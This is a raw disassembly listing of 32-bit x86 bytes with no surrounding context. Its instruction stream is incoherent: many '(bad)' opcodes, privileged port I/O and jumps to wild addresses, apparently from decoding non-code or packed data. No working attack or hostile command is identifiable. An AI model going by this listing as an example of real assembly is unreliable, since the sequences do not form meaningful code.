  41ab17:	sub    dh,BYTE PTR [ecx-0x7c]
  41ab1a:	mov    ah,0xfc
  41ab1c:	stc    
  41ab1d:	adc    DWORD PTR [eax],ebx
  41ab1f:	mov    ah,0x4
  41ab21:	fs jle 0x41aadd
  41ab24:	xor    cl,al
  41ab26:	mov    es,WORD PTR [esi-0x37]
  41ab29:	out    dx,al
  41ab2a:	out    dx,eax
  41ab2b:	mov    ecx,0xd4b29a17
  41ab30:	(bad)  
  41ab32:	dec    eax
  41ab33:	pop    ecx
  41ab34:	xor    esp,esi
  41ab36:	cvttps2pi mm1,QWORD PTR [ecx+0x5c]
  41ab3a:	adc    dh,ch
  41ab3c:	sbb    ebp,edi
  41ab3e:	or     ebx,DWORD PTR [eax]
  41ab40:	add    esp,DWORD PTR [ecx]
  41ab42:	fmul   DWORD PTR cs:[ebp+edx*8+0x51204df9]
  41ab4a:	popa   
  41ab4b:	mov    BYTE PTR [ecx-0x22317a9b],bl
  41ab51:	push   0x74
  41ab53:	cmp    BYTE PTR [eax-0x2d],dh
  41ab56:	xor    BYTE PTR [edx+0x7d],bh
  41ab59:	push   eax
  41ab5a:	push   ebp
  41ab5b:	mov    edx,0xc6a80dc4
  41ab60:	sub    eax,0xd271a192
  41ab65:	cld    
  41ab66:	daa    
  41ab67:	or     al,0x89
  41ab69:	pop    eax
  41ab6a:	pop    edi
  41ab6b:	jge    0x41abe1
  41ab6d:	nop
  41ab6e:	xchg   ecx,eax
  41ab6f:	pop    ds
  41ab70:	shl    DWORD PTR [esi],cl
  41ab72:	std    
  41ab73:	sbb    eax,0x8fb79fc3
  41ab78:	neg    DWORD PTR [eax-0x635345bc]
  41ab7e:	ins    DWORD PTR es:[edi],dx
  41ab7f:	test   eax,0x92c54f65
  41ab84:	in     eax,0x9a
  41ab86:	inc    ebp
  41ab87:	cmp    DWORD PTR [edi],ebx
  41ab89:	and    eax,0xb8b47b15
  41ab8e:	inc    ebp
  41ab8f:	lahf   
  41ab90:	inc    ebp
  41ab91:	fmul   st,st(5)
  41ab93:	jae    0x41ab2c
  41ab95:	stos   BYTE PTR es:[edi],al
  41ab96:	mov    ds:0x1bcb4b04,eax
  41ab9b:	jmp    0xec46b146
  41aba0:	dec    edx
  41aba1:	cld    
  41aba2:	xchg   ecx,eax
  41aba3:	je     0x41aba5
  41aba5:	leave  
  41aba6:	xchg   esp,eax
  41aba7:	adc    BYTE PTR [edx],ah
  41aba9:	fmul   st(5),st
  41abab:	not    BYTE PTR [edi]
  41abad:	mov    eax,0x28418313
  41abb2:	ins    BYTE PTR es:[edi],dx
  41abb3:	xor    BYTE PTR [edi],0x78
  41abb6:	cmp    cl,al
  41abb8:	fstp   TBYTE PTR [eax*4+0x25acdc51]
  41abbf:	sub    DWORD PTR [ebx-0xb892478],0x15
  41abc6:	pop    esp
  41abc7:	outs   dx,DWORD PTR ds:[esi]
  41abc8:	in     eax,dx
  41abc9:	int3   
  41abca:	sub    DWORD PTR [bp+di-0x2fde],ebx
  41abcf:	adc    DWORD PTR [edi],0x11
  41abd2:	clc    
  41abd3:	stos   DWORD PTR es:[edi],eax
  41abd4:	push   es
  41abd5:	push   esp
  41abd6:	loop   0x41ac03
  41abd8:	pushfw 
  41abda:	or     al,BYTE PTR [ebx]
  41abdc:	icebp  
  41abdd:	lods   al,BYTE PTR ds:[esi]
  41abde:	or     edx,eax
  41abe0:	mov    ebp,0x3e50655b
  41abe5:	cmp    al,BYTE PTR [edi+0x705bfca4]
  41abeb:	sbb    eax,0x5b5b3bb9
  41abf0:	mov    dh,0xc0
  41abf2:	jae    0x41abfe
  41abf4:	xchg   BYTE PTR [edx-0x5051edd7],bl
  41abfa:	out    dx,al
  41abfb:	xchg   esi,eax
  41abfc:	jecxz  0x41ac0f
  41abfe:	xchg   edi,eax
  41abff:	adc    esi,DWORD PTR [edx+0x7d1dcb15]
  41ac05:	mov    eax,ds:0xa3419805
  41ac0a:	push   esp
  41ac0b:	sbb    edx,DWORD PTR [edx+edi*1]
  41ac0e:	sbb    eax,0xe0
	...
  41ac73:	add    BYTE PTR [edx+0x49],ch
  41ac76:	es cmp al,0x27
  41ac79:	jg     0x41acf5
  41ac7b:	pop    edi
  41ac7c:	or     al,0x44
  41ac7e:	xor    ah,BYTE PTR [eax+eax*4+0x5d]
  41ac82:	xchg   BYTE PTR [ecx],cl
  41ac84:	add    BYTE PTR [ecx+eax*1],bl
  41ac87:	add    BYTE PTR [ecx+eax*1],al
  41ac8a:	add    BYTE PTR [eax],al
  41ac8c:	push   ss
  41ac8d:	push   edx
  41ac8e:	mov    ecx,DWORD PTR [eax+0x26]
  41ac91:	jmp    0x41acd6
  41ac93:	cld    
  41ac94:	std    
  41ac95:	jp     0x41acca
  41ac97:	cli    
  41ac98:	mov    ds,esi
  41ac9a:	scas   al,BYTE PTR es:[edi]
  41ac9b:	mov    ecx,0xd0fc993b
  41aca0:	mov    esi,DWORD PTR [edi]
  41aca2:	or     DWORD PTR [ecx+0x3],edi
  41aca5:	add    ebp,DWORD PTR [eax-0x3c]
  41aca8:	or     BYTE PTR [edi-0x356362ed],al
  41acae:	sub    BYTE PTR [ebx-0x59],ah
  41acb1:	push   ss
  41acb2:	daa    
  41acb3:	mov    edi,0x5f2e9330
  41acb8:	or     DWORD PTR [edx+0x542e1c67],0x3d2a523a
  41acc2:	add    ecx,ebx
  41acc4:	int3   
  41acc5:	int    0x31
  41acc7:	pop    es
  41acc8:	push   ebp
  41acc9:	popf   
  41acca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41accb:	or     eax,0xf1cf7213
  41acd0:	mov    esp,0x985a5306
  41acd5:	push   0x7b
  41acd7:	sahf   
  41acd8:	push   eax
  41acd9:	jge    0x41ad39
  41acdb:	(bad)  
  41acdc:	int3   
  41acdd:	mov    BYTE PTR ds:0xe4f27afe,al
  41ace3:	into   
  41ace4:	(bad)
  41ace8:	and    ebx,DWORD PTR [ebp+0x64316f4e]
  41acee:	sub    bl,BYTE PTR ds:0xb267583e
  41acf4:	ficom  DWORD PTR [esi-0x418e8783]
  41acfa:	adc    eax,0xfd0d6d31
  41acff:	mov    eax,0x19267f04
  41ad04:	mov    dl,BYTE PTR ds:0x4268b8a4
  41ad0a:	inc    esp
  41ad0b:	ja     0x41ace5
  41ad0d:	adc    BYTE PTR ds:0xbdd2cc6c,0xb
  41ad14:	push   cs
  41ad15:	loopne 0x41acf9
  41ad17:	lods   eax,DWORD PTR ds:[esi]
  41ad18:	mov    al,0xcd
  41ad1a:	iret   
  41ad1b:	mov    bh,0xe
  41ad1d:	shl    bh,1
  41ad1f:	enter  0x9f0f,0xa5
  41ad23:	shl    DWORD PTR [ebp-0x13],cl
  41ad26:	stos   BYTE PTR es:[edi],al
  41ad27:	lea    ebp,[edi+0x55]
  41ad2a:	sahf   
  41ad2b:	inc    esi
  41ad2c:	cli    
  41ad2d:	mov    edi,0x5884c440
  41ad32:	aas    
  41ad33:	cwde   
  41ad34:	stc    
  41ad35:	ficom  WORD PTR [edx+0x26]
  41ad38:	fist   WORD PTR [edi]
  41ad3a:	adc    ebp,DWORD PTR [esp+esi*8+0x59]
  41ad3e:	adc    edi,edi
  41ad40:	js     0x41acf1
  41ad42:	mov    al,0x80
  41ad44:	test   DWORD PTR [ecx],eax
  41ad46:	repz hlt 
  41ad48:	fisub  WORD PTR [ebx-0x32]
  41ad4b:	xor    BYTE PTR [edi+0xb],0xb2
  41ad4f:	test   eax,0x3214ac85
  41ad54:	lods   al,BYTE PTR ds:[esi]
  41ad55:	push   ss
  41ad56:	inc    esi
  41ad57:	test   BYTE PTR [eax],dh
  41ad59:	mov    esi,0x4405f7f4
  41ad5e:	add    BYTE PTR [ebp+0x2c],0xf0
  41ad62:	push   edx
  41ad63:	push   edi
  41ad64:	add    BYTE PTR [edx-0x3aceec0],bl
  41ad6a:	cmp    eax,0x7fe41ea
  41ad6f:	(bad)  
  41ad70:	outs   dx,DWORD PTR ds:[esi]
  41ad71:	add    esp,0xffffff98
  41ad74:	and    al,0x3a
  41ad76:	pop    es
  41ad77:	arpl   WORD PTR [ebp+eiz*1+0x1a],si
  41ad7b:	in     al,dx
  41ad7c:	mov    al,ds:0x5e556e11
  41ad81:	retf   0x5803
  41ad84:	adc    BYTE PTR [esi+0x32799632],al
  41ad8a:	repnz or DWORD PTR [eax],ecx
  41ad8d:	cmp    al,0xdb
  41ad8f:	sbb    al,0x0
	...
  41adf1:	add    BYTE PTR [eax],al
  41adf3:	add    BYTE PTR [ebp-0x8],dl
  41adf6:	or     DWORD PTR [esi-0x4280053],ebx
  41adfc:	dec    edi
  41adfd:	push   eax
  41adfe:	cmp    DWORD PTR [ebp+edi*8+0x43ecc6d],esp
  41ae05:	sbb    eax,0x1040001
  41ae0a:	add    BYTE PTR [eax],al
  41ae0c:	sub    al,0xe9
  41ae0e:	xor    eax,0xc938da07
  41ae13:	xchg   edx,eax
  41ae14:	push   edx
  41ae15:	pop    ebx
  41ae16:	push   ecx
  41ae17:	aad    0x28
  41ae19:	cmp    eax,0x96ce2cce
  41ae1e:	jns    0x41ae08
  41ae20:	jne    0x41adac
  41ae22:	inc    eax
  41ae23:	dec    ebp
  41ae24:	stc    
  41ae25:	jno    0x41adce
  41ae27:	and    eax,0xd409d525
  41ae2c:	dec    esi
  41ae2d:	xor    DWORD PTR [eax+0x17],edx
  41ae30:	shr    esp,1
  41ae32:	jns    0x41ae18
  41ae34:	sbb    BYTE PTR [ebx-0x259aed31],dh
  41ae3a:	aam    0x26
  41ae3c:	push   es
  41ae3d:	repnz lods eax,DWORD PTR ds:[esi]
  41ae3f:	ja     0x41ae0a
  41ae41:	iret   
  41ae42:	test   eax,0xb7d37e4b
  41ae47:	sar    DWORD PTR [ebx+0x46],1
  41ae4a:	jge    0x41ae3f
  41ae4c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ae4d:	sbb    al,0x7d
  41ae4f:	xchg   ebx,eax
  41ae50:	jb     0x41aea6
  41ae52:	les    eax,FWORD PTR [eax]
  41ae54:	jmp    0x596e:0xc6ad01f
  41ae5b:	scas   eax,DWORD PTR es:[edi]
  41ae5c:	addr16 inc edi
  41ae5e:	shr    dh,1
  41ae60:	lods   eax,DWORD PTR ds:[esi]
  41ae61:	fdivr  DWORD PTR [ecx+0x547c1f26]
  41ae67:	pop    eax
  41ae68:	jmp    0xce35eccd
  41ae6d:	dec    ecx
  41ae6e:	pop    ss
  41ae6f:	jecxz  0x41ae78
  41ae71:	mov    esp,0xc920d8c7
  41ae76:	sar    DWORD PTR [ebx-0x65],0xc7
  41ae7a:	sbb    DWORD PTR [ebx],esp
  41ae7c:	and    DWORD PTR [ebx],eax
  41ae7e:	retf   
  41ae7f:	daa    
  41ae80:	ret    
  41ae81:	jge    0x41aedb
  41ae83:	hlt    
  41ae84:	je     0x41ae0b
  41ae86:	call   0xf482bf0d
  41ae8b:	cmp    BYTE PTR [ecx-0x6a],bl
  41ae8e:	scas   al,BYTE PTR es:[edi]
  41ae8f:	mov    eax,0xedc79231
  41ae94:	mov    edi,0xbe11dd53
  41ae99:	out    dx,al
  41ae9a:	push   es
  41ae9b:	dec    esp
  41ae9c:	nop
  41ae9d:	mov    ds:0xe597f204,al
  41aea2:	das    
  41aea3:	in     eax,dx
  41aea4:	sbb    BYTE PTR [ebx+eiz*8+0x1ec4d3a7],al
  41aeab:	fsub   st,st(3)
  41aead:	hlt    
  41aeae:	push   ds
  41aeaf:	mov    ds:0xe7b57206,eax
  41aeb4:	push   eax
  41aeb5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41aeb6:	call   0x9d16685a
  41aebb:	sub    esp,DWORD PTR [ebp+0x359fc353]
  41aec1:	es mov esi,0x3201511
  41aec7:	icebp  
  41aec8:	mov    ds:0x4ad378f5,al
  41aecd:	and    DWORD PTR [ebx],0xffffffb0
  41aed0:	add    al,bh
  41aed2:	xor    BYTE PTR [esp+eax*8-0x778ea31d],dh
  41aed9:	ins    DWORD PTR es:[edi],dx
  41aeda:	pop    edi
  41aedb:	mov    edx,0x844a08c6
  41aee0:	pop    ss
  41aee1:	push   esp
  41aee2:	jnp    0x41aea8
  41aee4:	leave  
  41aee5:	out    0xdd,eax
  41aee7:	sub    edi,DWORD PTR [edi+edi*4]
  41aeea:	aas    
  41aeeb:	in     eax,0xe6
  41aeed:	addr16 push ss
  41aeef:	es mov cl,0xf1
  41aef2:	imul   eax,DWORD PTR [esi],0x78406b36
  41aef8:	pop    ds
  41aef9:	pop    ds
  41aefa:	call   0x6ffa:0x6028241
  41af01:	sub    edi,ebx
  41af03:	aad    0xdc
  41af05:	mov    ebp,0x7c765c50
  41af0a:	cwde   
  41af0b:	ror    DWORD PTR ds:0x3698d2,1
	...
  41af71:	add    BYTE PTR [eax],al
  41af73:	add    ch,al
  41af75:	stc    
  41af76:	lods   eax,DWORD PTR ds:[esi]
  41af77:	xor    edi,DWORD PTR [ebp+0x15ffdf77]
  41af7d:	mov    ecx,0x9d4a44ee
  41af82:	(bad)  
  41af83:	mov    ecx,DWORD PTR [eax]
  41af85:	push   ds
  41af86:	add    DWORD PTR [eax],eax
  41af88:	add    al,0x1
  41af8a:	add    BYTE PTR [eax],al
  41af8c:	outs   dx,BYTE PTR ds:[esi]
  41af8d:	(bad)  [edi-0x63]
  41af90:	mov    bh,0x61
  41af92:	(bad)  
  41af93:	add    DWORD PTR [eax+eax*4],eax
  41af96:	scas   al,BYTE PTR es:[edi]
  41af97:	js     0x41af70
  41af99:	mov    ds:0xd34e717a,al
  41af9e:	xor    bh,0x1e
  41afa1:	jmp    0x41af57
  41afa3:	out    0x88,al
  41afa5:	xchg   BYTE PTR ss:[ebp-0x7c],ah
  41afa9:	clc    
  41afaa:	arpl   WORD PTR [ecx+0x26],bp
  41afad:	pop    ebx
  41afae:	mov    esi,0xaa6f7aa5
  41afb3:	mov    DWORD PTR [edx-0x83752f8],ebx
  41afb9:	sbb    al,dh
  41afbb:	sub    eax,0x65520a93
  41afc0:	and    al,0xe8
  41afc2:	dec    eax
  41afc3:	or     ecx,DWORD PTR [ebp-0x2a]
  41afc6:	mov    ds:0x6979e475,al
  41afcb:	jg     0x41afd4
  41afcd:	sub    BYTE PTR [ebx+0x6f],dl
  41afd0:	ss ins DWORD PTR es:[edi],dx
  41afd2:	cwde   
  41afd3:	ret    0x8576
  41afd6:	cmp    bl,bl
  41afd8:	push   0x21a78a6f
  41afdd:	mov    dl,0xd8
  41afdf:	imul   BYTE PTR [ebp-0x54527234]
  41afe5:	ins    BYTE PTR es:[edi],dx
  41afe6:	jmp    0x41b018
  41afe8:	mov    ah,0x94
  41afea:	aaa    
  41afeb:	mov    edi,0xdf6751ff
  41aff0:	xchg   ecx,eax
  41aff1:	ins    BYTE PTR es:[edi],dx
  41aff2:	push   ds
  41aff3:	sub    eax,DWORD PTR [edx+0x5a26913f]
  41aff9:	or     ebp,edx
  41affb:	cmp    al,0xfb
  41affd:	iret   
  41affe:	cmc    
  41afff:	jle    0x41af8e
  41b001:	or     DWORD PTR [ecx-0x2df40e4],ebx
  41b007:	cdq    
  41b008:	mov    esp,0xa4cc0346
  41b00d:	adc    BYTE PTR ds:0x60b36d38,0xed
  41b014:	pop    edx
  41b015:	xchg   ebx,eax
  41b016:	jne    0x41b037
  41b018:	adc    eax,0x970ec668
  41b01d:	loop   0x41b038
  41b01f:	push   0x70
  41b021:	mov    edi,0xd76451f2
  41b026:	sub    DWORD PTR [ebx+0x1728e9d6],ebx
  41b02c:	lahf   
  41b02d:	pusha  
  41b02e:	push   es
  41b02f:	loop   0x41b01c
  41b031:	arpl   WORD PTR [esi],bp
  41b033:	mul    ebp
  41b035:	addr16 push 0x5
  41b038:	and    bl,BYTE PTR [eax-0x31]
  41b03b:	xor    BYTE PTR ds:0x17a04d6c,0x44
  41b042:	xchg   dh,bl
  41b044:	ss push es
  41b046:	fstp   TBYTE PTR [ebx]
  41b048:	add    ebx,DWORD PTR [ecx-0x75]
  41b04b:	or     edx,DWORD PTR [si+0xe2f]
  41b050:	lahf   
  41b051:	in     al,0xc
  41b053:	jnp    0x41b068
  41b055:	shl    DWORD PTR [esp+eax*8-0x20b5d207],cl
  41b05c:	add    eax,0x24d9919f
  41b061:	data16 cli 
  41b063:	cmp    eax,0x994ede7c
  41b068:	cld    
  41b069:	ret    
  41b06a:	cmc    
  41b06b:	or     eax,0x3a366e92
  41b070:	mov    bh,0xc0
  41b072:	add    bh,ah
  41b074:	adc    al,0x34
  41b076:	ficomp DWORD PTR [edi-0x7c55af2]
  41b07c:	jno    0x41b019
  41b07e:	mov    edx,0x350d9b65
  41b083:	es inc eax
  41b085:	mov    eax,ds:0x1faae3d1
  41b08a:	jno    0x41b069
  41b08c:	sbb    esi,DWORD PTR [esi*2+0x56]
	...
  41b0f3:	add    dh,al
  41b0f5:	ficom  WORD PTR [eax]
  41b0f7:	stos   DWORD PTR es:[edi],eax
  41b0f8:	sbb    bh,ch
  41b0fa:	(bad)  
  41b0fb:	call   DWORD PTR [edx+edx*8+0x75]
  41b0ff:	mov    edi,0x6ee46dda
  41b104:	or     al,0x1f
  41b106:	add    DWORD PTR [eax],eax
  41b108:	add    al,0x1
  41b10a:	add    BYTE PTR [eax],al
  41b10c:	out    0x5d,eax
  41b10e:	mov    edx,0xc0b03c49
  41b113:	or     edx,DWORD PTR [esi+0x48]
  41b116:	sar    WORD PTR [esi],0x28
  41b11a:	or     al,0x22
  41b11c:	in     al,0x5
  41b11e:	jle    0x41b119
  41b120:	adc    al,0xaf
  41b122:	aas    
  41b123:	enter  0xfa2,0xb6
  41b127:	jns    0x41b103
  41b129:	sbb    dl,BYTE PTR [esi+0x12]
  41b12c:	lahf   
  41b12d:	out    0x96,eax
  41b12f:	lods   eax,DWORD PTR ds:[esi]
  41b130:	mov    DWORD PTR [esi-0x3d],ebx
  41b133:	xchg   esi,eax
  41b134:	aas    
  41b135:	adc    ebp,esp
  41b137:	in     al,dx
  41b138:	fidiv  DWORD PTR [edi+0x11]
  41b13b:	sbb    ecx,DWORD PTR [ebp+0x65]
  41b13e:	rcr    edx,1
  41b140:	in     al,dx
  41b141:	xchg   edi,eax
  41b142:	pop    edi
  41b143:	add    esp,ebx
  41b145:	pop    ebx
  41b146:	mov    ah,0x73
  41b148:	sbb    cl,BYTE PTR ds:0xec39b53c
  41b14e:	sub    edx,DWORD PTR [edx-0x518a05e6]
  41b154:	adc    al,dh
  41b156:	add    eax,0xa0b29670
  41b15b:	pop    ds
  41b15c:	(bad)  
  41b15d:	mov    edi,0x5508ba9b
  41b162:	jae    0x41b17b
  41b164:	jb     0x41b0e9
  41b166:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b167:	sub    al,0x5c
  41b169:	stos   BYTE PTR es:[edi],al
  41b16a:	push   ebp
  41b16b:	imul   edx,DWORD PTR [esi],0x6b
  41b16e:	out    dx,al
  41b16f:	bound  ebx,QWORD PTR [ebx+0x1cf7500f]
  41b175:	fcomp  QWORD PTR [esi+0x2dffd50b]
  41b17b:	cmp    esi,ecx
  41b17d:	mov    dl,0x5d
  41b17f:	pop    ebp
  41b180:	jp     0x41b1a6
  41b182:	dec    esp
  41b183:	rcl    BYTE PTR [ebp+eiz*4-0x54],cl
  41b187:	out    0xe,eax
  41b189:	loopne 0x41b1ec
  41b18b:	fwait
  41b18c:	and    ebp,DWORD PTR [eax]
  41b18e:	ret    
  41b18f:	ds push eax
  41b191:	stc    
  41b192:	cmp    DWORD PTR [eax-0x6d],ebp
  41b195:	mov    bl,0x68
  41b197:	dec    esp
  41b198:	outs   dx,DWORD PTR ds:[esi]
  41b199:	dec    ecx
  41b19a:	jne    0x41b1f1
  41b19c:	xchg   DWORD PTR [ecx-0x6d4e6439],ebp
  41b1a2:	cmp    ax,0x3bb1
  41b1a6:	pop    edi
  41b1a7:	xor    eax,0xbcafcaf2
  41b1ac:	jb     0x41b184
  41b1ae:	xchg   edx,eax
  41b1af:	std    
  41b1b0:	jl     0x41b231
  41b1b2:	neg    DWORD PTR [edx+0x4f]
  41b1b5:	xor    dh,BYTE PTR [esi+eax*1]
  41b1b8:	sbb    al,0x35
  41b1ba:	leave  
  41b1bb:	imul   ebx,DWORD PTR [eax+edi*1+0x42],0x5a
  41b1c0:	inc    edi
  41b1c1:	loop   0x41b224
  41b1c3:	xor    esi,DWORD PTR [esi+eiz*2]
  41b1c6:	sbb    al,0xbc
  41b1c8:	mov    bh,0x91
  41b1ca:	push   esi
  41b1cb:	xor    DWORD PTR [ebx-0x7f2ffc9b],ecx
  41b1d1:	loopne 0x41b16c
  41b1d3:	pop    ebp
  41b1d4:	pop    ebp
  41b1d5:	inc    edx
  41b1d6:	add    ebx,DWORD PTR [esi-0x7b15429e]
  41b1dc:	out    0xd6,eax
  41b1de:	cdq    
  41b1df:	sub    eax,0x9076d408
  41b1e4:	jg     0x41b236
  41b1e6:	in     al,0xf8
  41b1e8:	jae    0x41b23a
  41b1ea:	xor    bl,dh
  41b1ec:	nop
  41b1ed:	jmp    0x88944fed
  41b1f2:	daa    
  41b1f3:	dec    edi
  41b1f4:	jl     0x41b22c
  41b1f6:	mov    ds:0xfc76d753,eax
  41b1fb:	repnz mov DWORD PTR [edx],esi
  41b1fe:	rcl    DWORD PTR [ebx+0x43f8a333],cl
  41b204:	jg     0x41b1fe
  41b206:	jmp    0x9fe7:0xf4920ac6
  41b20d:	inc    ecx
  41b20e:	xor    bl,BYTE PTR [ebp+0x0]
	...
  41b271:	add    BYTE PTR [eax],al
  41b273:	add    BYTE PTR [esi+0x6be069a5],cl
  41b279:	in     al,dx
  41b27a:	(bad)  
  41b27b:	out    dx,eax
  41b27c:	stos   BYTE PTR es:[edi],al
  41b27d:	jge    0x41b21a
  41b27f:	or     BYTE PTR [ebp+0x104b7683],bl
  41b285:	and    BYTE PTR [ecx],al
  41b287:	add    BYTE PTR [ecx+eax*1],al
  41b28a:	add    BYTE PTR [eax],al
  41b28c:	sub    ah,BYTE PTR [edx]
  41b28e:	cli    
  41b28f:	push   ecx
  41b290:	dec    ecx
  41b291:	outs   dx,BYTE PTR ds:[esi]
  41b292:	push   esp
  41b293:	arpl   WORD PTR [ebx+ecx*4-0x48],cx
  41b297:	sub    DWORD PTR [ebp+0x2347194b],ebp
  41b29d:	shl    DWORD PTR ds:0x3c2325c1,cl
  41b2a3:	add    DWORD PTR [edx+0x721ae37f],edx
  41b2a9:	lock imul ecx,DWORD PTR [eax],0x8c04891e
  41b2b0:	loop   0x41b2be
  41b2b2:	(bad)  
  41b2b4:	repz (bad) 
  41b2b6:	xchg   ebx,eax
  41b2b7:	mov    ch,0xb8
  41b2b9:	ds addr16 jle 0x41b2af
  41b2bd:	lahf   
  41b2be:	xchg   esp,eax
  41b2bf:	es pusha 
  41b2c1:	loop   0x41b2e9
  41b2c3:	add    ah,0x93
  41b2c6:	mov    BYTE PTR [ebx+0x22b813c],dh
  41b2cc:	jno    0x235dd020
  41b2d2:	adc    al,0xb8
  41b2d4:	xlat   BYTE PTR ds:[ebx]
  41b2d5:	dec    ecx
  41b2d6:	inc    esp
  41b2d7:	test   DWORD PTR [edi+ebx*8],ebp
  41b2da:	mov    esp,0xdc464ca6
  41b2df:	cmp    DWORD PTR [eax],ebp
  41b2e1:	xor    DWORD PTR [edx+esi*2+0x719f2d50],ebp
  41b2e8:	pop    esp
  41b2e9:	mov    edi,0x6dea8150
  41b2ee:	ds xchg esp,eax
  41b2f0:	sub    ah,BYTE PTR [edi+0x6210c56b]
  41b2f6:	or     eax,0x70fbafae
  41b2fb:	pushf  
  41b2fc:	int    0xa4
  41b2fe:	push   cs
  41b2ff:	inc    edi
  41b300:	nop
  41b301:	retf   0xd973
  41b304:	xchg   ebp,eax
  41b305:	fwait
  41b306:	aad    0xbd
  41b308:	sbb    BYTE PTR [edi-0x554a6985],ah
  41b30e:	dec    ebp
  41b30f:	jecxz  0x41b2e2
  41b311:	inc    ebp
  41b312:	popa   
  41b313:	(bad)  
  41b314:	loope  0x41b2d0
  41b316:	sbb    BYTE PTR [edi+ebx*8-0x5307481b],ch
  41b31d:	or     ebp,edx
  41b31f:	sahf   
  41b320:	jb     0x41b360
  41b322:	in     al,dx
  41b323:	mov    ecx,0xc545701e
  41b328:	outs   dx,DWORD PTR ds:[esi]
  41b329:	icebp  
  41b32a:	outs   dx,BYTE PTR ds:[esi]
  41b32b:	add    DWORD PTR [ebp+0xd61089d],edi
  41b331:	cs jmp 0x41b2c5
  41b334:	ss (bad) 
  41b337:	adc    al,0xd1
  41b339:	xchg   esp,eax
  41b33a:	and    eax,0x42f727a
  41b33f:	jae    0x41b32f
  41b341:	sbb    ah,dh
  41b343:	mov    esi,0x35ed416c
  41b348:	sub    eax,0xa796f952
  41b34d:	sbb    DWORD PTR [eax],0x98057c0
  41b353:	sub    ah,bh
  41b355:	ss mov edx,0x935e8217
  41b35b:	pop    ecx
  41b35c:	das    
  41b35d:	mov    esp,0x7b2c2178
  41b362:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b363:	or     bh,BYTE PTR [edx+0x5f88e49c]
  41b369:	cdq    
  41b36a:	shr    BYTE PTR [edx-0x10],1
  41b36d:	imul   ebx,DWORD PTR [esi],0x587f0b33
  41b373:	mov    al,0x65
  41b375:	xchg   BYTE PTR [edx-0x475d70cd],dl
  41b37b:	cli    
  41b37c:	nop
  41b37d:	fnsave [edi-0x45]
  41b380:	sub    DWORD PTR [edx+0x9ec18b3],0x896e86a4
  41b38a:	inc    eax
  41b38b:	jle    0x41b35b
  41b38d:	mov    ds:0x4a18,eax
	...
  41b3f2:	add    BYTE PTR [eax],al
  41b3f4:	dec    eax
  41b3f5:	or     eax,0xbb5dab1d
  41b3fa:	(bad)  
  41b3fb:	out    dx,eax
  41b3fc:	xchg   ebp,eax
  41b3fd:	iret   
  41b3fe:	push   ebx
  41b3ff:	aas    
  41b400:	sbb    bl,ah
  41b402:	iret   
  41b403:	lahf   
  41b404:	adc    al,0x21
  41b406:	add    DWORD PTR [eax],eax
  41b408:	add    al,0x1
  41b40a:	add    BYTE PTR [eax],al
  41b40c:	and    DWORD PTR [ebx],edx
  41b40e:	aad    0x16
  41b410:	ss mov ch,0x21
  41b413:	push   ebp
  41b414:	fbld   TBYTE PTR [esi-0x74]
  41b417:	inc    BYTE PTR [edx]
  41b419:	xchg   edi,eax
  41b41b:	mov    ebx,0xc77d9a20
  41b420:	cwde   
  41b421:	popf   
  41b422:	into   
  41b423:	ret    0x8c48
  41b426:	je     0x41b40b
  41b428:	test   DWORD PTR [eax+0x47bb3479],ecx
  41b42e:	xlat   BYTE PTR ds:[ebx]
  41b42f:	add    edx,DWORD PTR [eax-0x399a3b02]
  41b435:	clc    
  41b436:	and    al,0xbd
  41b438:	and    dl,ch
  41b43a:	jp     0x41b40e
  41b43c:	imul   edi,DWORD PTR [eax],0xffffffd4
  41b43f:	cli    
  41b440:	xlat   BYTE PTR ds:[ebx]
  41b441:	imul   ebx,DWORD PTR [ecx],0x6cd1138b
  41b447:	push   edx
  41b448:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b449:	adc    DWORD PTR [esi-0x4b],ebx
  41b44c:	mov    edx,0xcd74a65e
  41b451:	add    BYTE PTR [edx+0x3],bl
  41b454:	(bad)  
  41b455:	fimul  WORD PTR [ebp-0x3f]
  41b458:	mov    ah,0x5d
  41b45a:	test   al,0x89
  41b45c:	ins    DWORD PTR es:[edi],dx
  41b45d:	test   BYTE PTR [edx-0x70dd5f70],bl
  41b463:	fiadd  DWORD PTR fs:[esi]
  41b466:	nop
  41b467:	cmp    DWORD PTR [esi],edx
  41b469:	fwait
  41b46a:	and    DWORD PTR [eax],esi
  41b46c:	pop    esp
  41b46d:	xchg   BYTE PTR [ecx+0x479e79f4],al
  41b473:	retf   
  41b474:	push   esp
  41b475:	pop    edi
  41b476:	test   BYTE PTR [ecx-0x1d],al
  41b479:	dec    eax
  41b47a:	fidivr WORD PTR [esi+0x58]
  41b47d:	je     0x41b422
  41b47f:	hlt    
  41b480:	push   ss
  41b481:	sub    eax,0xadc6509e
  41b486:	fsubr  DWORD PTR [esi]
  41b488:	(bad)  
  41b48a:	jae    0x41b42d
  41b48c:	pushf  
  41b48d:	jmp    0x41b4f7
  41b48f:	out    dx,eax
  41b490:	inc    eax
  41b491:	mov    eax,0x3e42404
  41b496:	add    BYTE PTR [ecx],dl
  41b498:	fwait
  41b499:	push   edx
  41b49a:	or     DWORD PTR [esi+ebx*1+0x30],ebx
  41b49e:	mov    edx,0x24e689d8
  41b4a3:	(bad)  
  41b4a4:	fs push 0xa4dbd6ae
  41b4aa:	arpl   WORD PTR [eax],ax
  41b4ac:	pushf  
  41b4ad:	mov    BYTE PTR [eax-0x2],bh
  41b4b0:	leave  
  41b4b1:	mov    eax,0xeb238961
  41b4b6:	scas   al,BYTE PTR es:[edi]
  41b4b7:	imul   esi,eax,0x55
  41b4ba:	cmp    BYTE PTR [ebx+0x60],bh
  41b4bd:	ins    BYTE PTR es:[edi],dx
  41b4be:	aam    0x77
  41b4c0:	jb     0x41b509
  41b4c2:	inc    esi
  41b4c3:	pop    ecx
  41b4c4:	adc    eax,0x6325e032
  41b4c9:	rol    BYTE PTR [esi+0x57],0x56
  41b4cd:	push   0xffffff9f
  41b4cf:	out    0x3f,eax
  41b4d1:	dec    BYTE PTR [ebx+0x25c2c84e]
  41b4d7:	imul   ebx,DWORD PTR ds:0xc1f0e807,0xffffffb5
  41b4de:	and    al,0x2a
  41b4e0:	in     al,dx
  41b4e1:	or     eax,0x2d0b5037
  41b4e6:	mov    bl,0xea
  41b4e8:	std    
  41b4e9:	or     ebp,esi
